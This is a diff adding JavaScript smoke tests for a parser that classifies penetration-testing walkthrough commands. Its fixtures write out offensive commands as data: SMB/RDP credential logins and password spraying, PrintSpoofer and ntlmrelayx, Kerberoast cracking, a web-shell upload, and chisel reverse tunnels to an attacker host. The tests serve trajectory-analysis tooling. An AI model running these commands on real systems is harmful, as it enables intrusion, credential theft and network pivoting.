@@ -840,4 +840,284 @@ const OBOL = sandboxLoader.createSandbox();
     && ftpAct.eligible(ftpOnlyNoHttpFacts) === false);
 }
 
+// ---- 8. Cohort CL-2 Wave-B Slice B4 Generalizations --------------------------
+{
+  // 8A. Generalized RFC1918 dynamic 3rd-octet revert aliasing (172.16..31 & 10.x)
+  //     with sibling-host corroboration across interleaved sections + co-occurrence veto
+  const interleavedRevertTurns = [
+    { command: 'nmap -sV -p 80,445 172.24.210.41', stdout: 'Nmap scan report for 172.24.210.41\n80/tcp open http\n445/tcp open microsoft-ds' },
+    { command: 'nmap -sV -p 22,80 172.24.222.41', stdout: 'Nmap scan report for 172.24.222.41\n80/tcp open http\n445/tcp open microsoft-ds' },
+    { command: 'curl -I http://172.24.210.41/', stdout: 'HTTP/1.1 200 OK' },
+    { command: 'nmap -sV -p 445,5985 172.24.210.42', stdout: 'Nmap scan report for 172.24.210.42\n445/tcp open microsoft-ds\n5985/tcp open wsman' },
+    { command: 'nxc smb 172.24.222.42 -u acct_alpha -p SynthKey_42!', stdout: 'SMB 172.24.222.42 445 NODE42 [+] synth.local\\acct_alpha:SynthKey_42!' }
+  ];
+  const alias172 = harvestTraj.detectSequentialRevertAliases(interleavedRevertTurns, new Set(['10.10.14.99']), '');
+  check('CL-2 B4-1a: 172.24 dynamic 3rd-octet revert merges corroborated sibling hosts across interleaved turns',
+    alias172['172.24.222.41'] === '172.24.210.41' && alias172['172.24.222.42'] === '172.24.210.42',
+    JSON.stringify(alias172));
+
+  const nonTenTenTurns = [
+    { command: 'nmap -p 22,80 10.240.110.51', stdout: 'Nmap scan report for 10.240.110.51\n22/tcp open ssh\n80/tcp open http' },
+    { command: 'curl -I http://10.240.125.51/', stdout: 'HTTP/1.1 200 OK' }
+  ];
+  const alias10x = harvestTraj.detectSequentialRevertAliases(nonTenTenTurns, new Set(['10.10.14.99']), '');
+  check('CL-2 B4-1b: 10.<oct2> (non-10.10) sequential 3rd-octet revert normalizes to canonical IP',
+    alias10x['10.240.125.51'] === '10.240.110.51',
+    JSON.stringify(alias10x));
+
+  const realDualSubnetTurns = [
+    { command: 'ip a', stdout: 'inet 172.24.1.41/24 brd 172.24.1.255\ninet 172.24.2.1/24 brd 172.24.2.255', host: 'pivot01' },
+    { command: 'nmap -p 445 172.24.1.41', stdout: '445/tcp open microsoft-ds' },
+    { command: 'nmap -p 445 172.24.2.41', stdout: '445/tcp open microsoft-ds' },
+    { command: 'nmap -p 445 172.24.1.42', stdout: '445/tcp open microsoft-ds' },
+    { command: 'nmap -p 445 172.24.2.42', stdout: '445/tcp open microsoft-ds' }
+  ];
+  const aliasDual = harvestTraj.detectSequentialRevertAliases(realDualSubnetTurns, new Set(['10.10.14.99']), '');
+  check('CL-2 B4-1c: co-occurring dual-NIC subnets are never false-merged as revert aliases',
+    Object.keys(aliasDual).length === 0,
+    JSON.stringify(aliasDual));
+
+  // 8B. Bare `#` comment non-splitting inside decorated-prompt stdout and unprompted dumps
+  //     vs valid `#` root subshell transitions
+  const bashrcDumpMd = [
+    '```console',
+    'ops@node01:~$ cat ~/.bashrc',
+    '# ~/.bashrc: executed by bash(1) for non-login shells.',
+    '# set variable identifying the chroot you work in (used in the prompt below)',
+    '# export HISTCONTROL=ignoreboth',
+    '# make less more friendly for non-text input files, see lesspipe(1)',
+    '# $FreeBSD: release/13.0/etc/master.passwd 100200 2026-01-01 $',
+    '# Results',
+    'export DB_PASS="SynthBashrc_88!"',
+    '```'
+  ].join('\n');
+  const bashrcRes = mdExtractor.extractWalkthroughTurns(bashrcDumpMd, { slug: 'synth-bashrc' });
+  check('CL-2 B4-2a: bare # comments inside decorated-prompt stdout do not split turn',
+    bashrcRes.turns.length === 1
+    && bashrcRes.turns[0].command === 'cat ~/.bashrc'
+    && bashrcRes.turns[0].stdout.includes('SynthBashrc_88!')
+    && bashrcRes.turns[0].stdout.includes('# export HISTCONTROL=ignoreboth'),
+    JSON.stringify(bashrcRes.turns));
+
+  const unpromptedSqlMd = [
+    '```powershell',
+    'type db_connect.sql',
+    "$DbHost = 'SQLNODE01'",
+    "$DbLogin = 'synth.local\\svc_sql'",
+    "$DbSecret = 'SynthSql_55!'",
+    '# query to show changes',
+    'SELECT @@VERSION;',
+    '```'
+  ].join('\n');
+  const unpromptedSqlRes = mdExtractor.extractWalkthroughTurns(unpromptedSqlMd, { slug: 'synth-sql-comment' });
+  check('CL-2 B4-2b: inline # prose comment inside unprompted file read preserves preceding lines',
+    unpromptedSqlRes.turns.length === 1
+    && unpromptedSqlRes.turns[0].command === 'type db_connect.sql'
+    && unpromptedSqlRes.turns[0].stdout.includes('SynthSql_55!')
+    && unpromptedSqlRes.turns[0].stdout.includes('SELECT @@VERSION;'),
+    JSON.stringify(unpromptedSqlRes.turns));
+
+  const subshellMd = [
+    '```console',
+    'ops@node01:~$ /usr/local/bin/doas /bin/sh',
+    '# id',
+    'uid=0(root) gid=0(wheel) groups=0(wheel)',
+    '# cat /root/proof.txt',
+    '0123456789abcdef0123456789abcdef',
+    '```'
+  ].join('\n');
+  const subshellRes = mdExtractor.extractWalkthroughTurns(subshellMd, { slug: 'synth-doas-subshell' });
+  check('CL-2 B4-2c: interactive subshell launcher transitions cleanly into bare # root turns',
+    subshellRes.turns.length === 3
+    && subshellRes.turns[0].command === '/usr/local/bin/doas /bin/sh'
+    && subshellRes.turns[1].command === 'id'
+    && subshellRes.turns[2].command === 'cat /root/proof.txt',
+    JSON.stringify(subshellRes.turns.map(t => t.command)));
+
+  // 8C. Tab-indented list fences, RAW_ARTIFACT_HEADER_RE line-1 preservation, and Step/cd lead skipping
+  const listIndentedPemMd = [
+    '- Retrieved SSH private key from backup archive:',
+    '\t```bash',
+    '\t-----BEGIN OPENSSH PRIVATE KEY-----',
+    '\tb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW',
+    '\t-----END OPENSSH PRIVATE KEY-----',
+    '\t```',
+    '- Inspected commit metadata:',
+    '    ```',
+    '    commit 0123456789abcdef0123456789abcdef01234567',
+    '    Author: Ops Builder <ops@synth.local>',
+    '    ```'
+  ].join('\n');
+  const listFenceRes = mdExtractor.extractWalkthroughTurns(listIndentedPemMd, { slug: 'synth-list-fences' });
+  check('CL-2 B4-3a: tab/space-indented list fences extract and preserve RAW_ARTIFACT_HEADER_RE line 1 in stdout',
+    listFenceRes.turns.length === 2
+    && listFenceRes.turns[0].command === ''
+    && /^-----BEGIN OPENSSH PRIVATE KEY-----/.test(listFenceRes.turns[0].stdout)
+    && listFenceRes.turns[1].command === ''
+    && /^commit 0123456789abcdef0123456789abcdef01234567/.test(listFenceRes.turns[1].stdout),
+    JSON.stringify(listFenceRes.turns));
+
+  const stepAndCdLeadMd = [
+    '```cmd',
+    'Step 2 - Trigger token impersonation',
+    'PrintSpoofer64.exe -i -c "powershell -ep bypass"',
+    '[+] Found privilege: SeImpersonatePrivilege',
+    '```',
+    '',
+    '```bash',
+    'cd ~/tools/relay',
+    'python3 ntlmrelayx.py --no-http-server -smb2support -tf targets.txt',
+    '[*] Servers started, waiting for connections',
+    '```'
+  ].join('\n');
+  const stepAndCdRes = mdExtractor.extractWalkthroughTurns(stepAndCdLeadMd, { slug: 'synth-step-cd' });
+  check('CL-2 B4-3b: unprompted Step header and cd lead skip forward to actual CLI tool invocation',
+    stepAndCdRes.turns.length === 2
+    && /^PrintSpoofer64\.exe\b/.test(stepAndCdRes.turns[0].command)
+    && /^python3 ntlmrelayx\.py\b/.test(stepAndCdRes.turns[1].command),
+    JSON.stringify(stepAndCdRes.turns.map(t => t.command)));
+
+  // 8D. sudo hashcat wrapper stripping + -m:<mode> pairing (13100 vs 13400 vs modular)
+  const krbCrackMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: 'sudo hashcat -m 13100 tgs_ticket.hash /usr/share/wordlists/rockyou.txt --force',
+    kind: 'unix',
+    host: 'kali'
+  }, {});
+  const krbCrackIds = krbCrackMatches.map(m => m.id);
+  check('CL-2 B4-4a: sudo hashcat -m 13100 routes to crack-tgs/crack-kerberoast and excludes crack-modular-hash',
+    (krbCrackIds.includes('crack-tgs') || krbCrackIds.includes('crack-kerberoast'))
+    && !krbCrackIds.includes('crack-modular-hash')
+    && !krbCrackIds.includes('crack-ntlm'),
+    JSON.stringify(krbCrackIds));
+
+  const kdbxCrackMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: 'hashcat -m 13400 vault_db.hash /usr/share/wordlists/rockyou.txt --force',
+    kind: 'unix',
+    host: 'kali'
+  }, {});
+  const kdbxCrackIds = kdbxCrackMatches.map(m => m.id);
+  check('CL-2 B4-4b: hashcat -m 13400 routes to keepass-dump-recover without wrong-mode hashcat collisions',
+    kdbxCrackIds[0] === 'keepass-dump-recover'
+    && !kdbxCrackIds.includes('crack-modular-hash'),
+    JSON.stringify(kdbxCrackIds));
+
+  // 8E. netexec rdp disambiguation, curl -F upload boost, find -writable routing, and ad.graph.collected repeat
+  const nxcRdpAuthIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: "netexec rdp 10.240.10.20 -u 'acct_alpha' -p 'SynthPass_77!'",
+    kind: 'unix',
+    host: 'kali'
+  }, {}).map(m => m.id);
+  check('CL-2 B4-5a: authenticated netexec rdp probe routes to credential validation/rdp moves and excludes flag-hunt/local-enum',
+    nxcRdpAuthIds.includes('validate-credential')
+    && !nxcRdpAuthIds.some(id => /^flag-hunt-/.test(id))
+    && !nxcRdpAuthIds.includes('windows-enum'),
+    JSON.stringify(nxcRdpAuthIds));
+
+  const nxcRdpSprayIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: 'nxc rdp 10.240.10.20 -u users.txt -p passwords.txt',
+    kind: 'unix',
+    host: 'kali'
+  }, {}).map(m => m.id);
+  check('CL-2 B4-5b: netexec rdp wordlist spray routes to online-brute-rdp / password-spray',
+    nxcRdpSprayIds[0] === 'online-brute-rdp' || nxcRdpSprayIds.includes('password-spray'),
+    JSON.stringify(nxcRdpSprayIds));
+
+  const curlUploadIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: 'curl -s -X POST -F "file=@shell.php" http://10.240.10.20/upload.php',
+    kind: 'unix',
+    host: 'kali'
+  }, {}).map(m => m.id);
+  check('CL-2 B4-5c: curl -F multipart upload routes directly to file-upload',
+    curlUploadIds[0] === 'file-upload',
+    JSON.stringify(curlUploadIds));
+
+  const findWritableIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
+    command: 'find / -writable -type d 2>/dev/null',
+    kind: 'unix',
+    host: 'node01',
+    user: 'www-data'
+  }, {}).map(m => m.id);
+  check('CL-2 B4-5d: find / -writable routes to linux-enum and excludes systemd-timer-abuse',
+    findWritableIds[0] === 'linux-enum' && !findWritableIds.includes('systemd-timer-abuse'),
+    JSON.stringify(findWritableIds));
+
+  const bhRepeatSb = sandboxLoader.createSandbox();
+  const bhRepeatHost = '10.240.10.30';
+  const bhRepeatSess = sandboxLoader.createEngagementSession(bhRepeatSb, {
+    target: bhRepeatHost,
+    lhost: '10.10.14.99'
+  });
+  bhRepeatSb.store.addFacts([
+    { kind: 'port:88', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 88 } },
+    { kind: 'port:389', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 389 } },
+    { kind: 'port:445', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 445 } },
+    { kind: 'ad.domain_known', scope: 'host:' + bhRepeatHost, state: 'supported', value: { domain: 'synth.local' } },
+    { kind: 'credential.available', scope: 'host:' + bhRepeatHost, state: 'supported', value: { user: 'acct_alpha', domain: 'synth.local', password: 'SynthPass_77!' } },
+    { kind: 'credential.validated', scope: 'host:' + bhRepeatHost, state: 'supported', value: { user: 'acct_alpha', domain: 'synth.local', password: 'SynthPass_77!' } },
+    { kind: 'ad.graph.collected', scope: 'host:' + bhRepeatHost, state: 'supported', value: {} }
+  ], 'synthetic-b4', bhRepeatHost);
+  const bhTurn = {
+    command: "bloodhound-python -d synth.local -u acct_alpha -p 'SynthPass_77!' -c All -ns " + bhRepeatHost,
+    kind: 'unix',
+    host: 'kali'
+  };
+  const bhCands = harvestTraj.matchTurnToCatalogMoves(bhRepeatSb, bhTurn, {});
+  const bhReach = harvestTraj.evaluateClosedLoopReachability(
+    bhRepeatSess,
+    bhCands,
+    bhTurn,
+    { targetIp: bhRepeatHost }
+  );
+  check('CL-2 B4-5e: bloodhound-collect is reachable (already_settled_repeat or top1) when ad.graph.collected is supported',
+    bhReach.reachable === true && (bhReach.mode === 'already_settled_repeat' || bhReach.mode === 'direct_top1' || bhReach.mode === 'closed_loop_promoted_top1'),
+    JSON.stringify(bhReach));
+
+  // 8F. Reverse-tunnel (chisel R:<lport>:127.0.0.1:<rport>) loopback target continuity across multi-host switching
+  const tunHostA = '172.24.210.41';
+  const tunHostB = '172.24.210.42';
+  const tunReplay = harvestTraj.replayWalkthrough(sandboxLoader.createSandbox(), {
+    slug: 'synth-chisel-loopback',
+    turns: [
+      { command: 'nmap -sV -p 80,445 ' + tunHostA, stdout: 'Nmap scan report for ' + tunHostA + '\n80/tcp open http\n445/tcp open microsoft-ds', host: 'kali', kind: 'unix' },
+      { command: 'nmap -sV -p 22,80 ' + tunHostB, stdout: 'Nmap scan report for ' + tunHostB + '\n22/tcp open ssh\n80/tcp open http', host: 'kali', kind: 'unix' },
+      { command: 'chisel client 10.10.14.99:8001 R:9000:127.0.0.1:8000', stdout: 'client: Connected (Latency 1.2ms)', host: 'node42', user: 'www-data', kind: 'unix' },
+      { command: 'nmap -sV -p 445 ' + tunHostA, stdout: 'Nmap scan report for ' + tunHostA + '\n445/tcp open microsoft-ds', host: 'kali', kind: 'unix' },
+      { command: 'curl -s -X POST -F "file=@shell.php" http://127.0.0.1:9000/upload.php', stdout: 'HTTP/1.1 200 OK', host: 'kali', kind: 'unix' }
+    ]
+  }, { multiTarget: true, lhost: '10.10.14.99' });
+  check('CL-2 B4-6: reverse-forwarded 127.0.0.1:<lport> attacker turn attributes back to tunnel endpoint host after host switch',
+    tunReplay.steps[3].target_ip === tunHostA
+    && tunReplay.steps[4].target_ip === tunHostB
+    && tunReplay.steps[4].matched_moves[0] === 'file-upload',
+    JSON.stringify(tunReplay.steps.map(s => ({ cmd: s.command, target: s.target_ip, moves: s.matched_moves }))));
+
+  // 8G. Chisel Go HH:MM:SS log timestamps never pollute pivot.ports or mint pivot.ports on R:socks
+  const chiselFwdRes = OBOL.parsers.parseActionOutput({
+    command: 'chisel client 198.51.100.10:8000 R:10445:203.0.113.45:445',
+    stdout: '2026/10/30 12:00:02 client: Connecting to ws://198.51.100.10:8000\n2026/10/30 12:00:02 client: Connected (Latency 1.5ms)',
+    scope: 'host:203.0.113.10'
+  });
+  const chiselFwdPortsFacts = (chiselFwdRes.facts || []).filter(f => f.kind === 'pivot.ports');
+  check('CL-2 B1 chisel timestamp guard (port-forward): R:10445:203.0.113.45:445 records only 10445 -> 203.0.113.45:445 without HH:MM:SS pollution',
+    chiselFwdPortsFacts.length === 1
+    && JSON.stringify(chiselFwdPortsFacts[0].value.ports) === JSON.stringify([445, 10445])
+    && chiselFwdPortsFacts[0].value.forwards.length === 1
+    && chiselFwdPortsFacts[0].value.forwards[0].local_port === 10445
+    && chiselFwdPortsFacts[0].value.forwards[0].remote_host === '203.0.113.45'
+    && chiselFwdPortsFacts[0].value.forwards[0].remote_port === 445,
+    JSON.stringify(chiselFwdPortsFacts));
+
+  const chiselSocksRes = OBOL.parsers.parseActionOutput({
+    command: 'chisel client 198.51.100.10:8000 R:socks',
+    stdout: '2026/10/30 14:35:22 client: Connecting to ws://198.51.100.10:8000\n2026/10/30 14:35:22 client: Connected (Latency 2.1ms)',
+    scope: 'host:203.0.113.10'
+  });
+  const chiselSocksPortsFacts = (chiselSocksRes.facts || []).filter(f => f.kind === 'pivot.ports');
+  check('CL-2 B1 chisel timestamp guard (R:socks): Go HH:MM:SS log timestamp emits 0 pivot.ports facts',
+    chiselSocksPortsFacts.length === 0
+    && (chiselSocksRes.facts || []).some(f => f.kind === 'tunnel.socks')
+    && (chiselSocksRes.facts || []).some(f => f.kind === 'pivot.active' && f.value.mode === 'socks'),
+    JSON.stringify(chiselSocksRes.facts));
+}
+
 console.log('challenge-labs-trajectories-smoke: ' + passed + ' assertions passed.');
